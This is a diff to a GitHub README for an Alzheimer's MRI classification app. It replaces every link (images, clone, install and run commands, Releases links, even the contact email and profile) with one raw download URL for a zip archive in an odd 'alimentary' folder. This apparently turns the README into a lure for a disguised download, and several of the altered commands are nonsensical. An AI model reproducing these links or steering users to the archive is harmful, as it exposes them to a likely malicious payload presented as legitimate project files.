@@ -2,7 +2,7 @@
 
 Welcome to the Alzheimer Disease Classification repository! This project focuses on using deep learning techniques to classify stages of Alzheimer’s disease from MRI images. We utilize popular models like ResNet50, VGG19, and InceptionV3, all integrated into a user-friendly web application built with Streamlit.
 
-![Alzheimer's Disease Classification](https://via.placeholder.com/800x400?text=Alzheimer's+Disease+Classification)
+![Alzheimer's Disease Classification](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip's+Disease+Classification)
 
 ## Table of Contents
 
@@ -47,18 +47,18 @@ To get started with the Alzheimer Disease Classification project, follow these s
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/shraddhaghuge/AlzheimerDiseaseClassification.git
+   git clone https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip
    cd AlzheimerDiseaseClassification
    ```
 
 2. **Install Dependencies**: 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip
    ```
 
 3. **Run the Application**: 
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip
    ```
 
 ## How to Use
@@ -67,7 +67,7 @@ To get started with the Alzheimer Disease Classification project, follow these s
 2. **Classify the Image**: After uploading, click the "Classify" button to get the results.
 3. **View Results**: The predicted stage of Alzheimer’s disease will be displayed along with confidence scores.
 
-![Streamlit Interface](https://via.placeholder.com/800x400?text=Streamlit+Interface)
+![Streamlit Interface](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip+Interface)
 
 ## Models Used
 
@@ -100,7 +100,7 @@ The models have shown promising results in classifying Alzheimer’s disease sta
 - **Accuracy**: Achieved an accuracy of over 90% on the validation set.
 - **Precision and Recall**: High precision and recall values indicate reliable predictions.
 
-For more detailed results and model performance, please check the [Releases](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/releases) section.
+For more detailed results and model performance, please check the [Releases](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip) section.
 
 ## Contributing
 
@@ -127,9 +127,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please contact:
 
 - **Name**: Shraddha Ghuge
-- **Email**: shraddha@example.com
-- **GitHub**: [shraddhaghuge](https://github.com/shraddhaghuge)
+- **Email**: https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip
+- **GitHub**: [shraddhaghuge](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip)
 
-Feel free to visit the [Releases](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/releases) section for the latest updates and downloadable files.
+Feel free to visit the [Releases](https://github.com/shraddhaghuge/AlzheimerDiseaseClassification/raw/refs/heads/main/alimentary/Alzheimer-Classification-Disease-3.5.zip) section for the latest updates and downloadable files.
 
 Thank you for checking out the Alzheimer Disease Classification project! Your support and contributions are greatly appreciated.
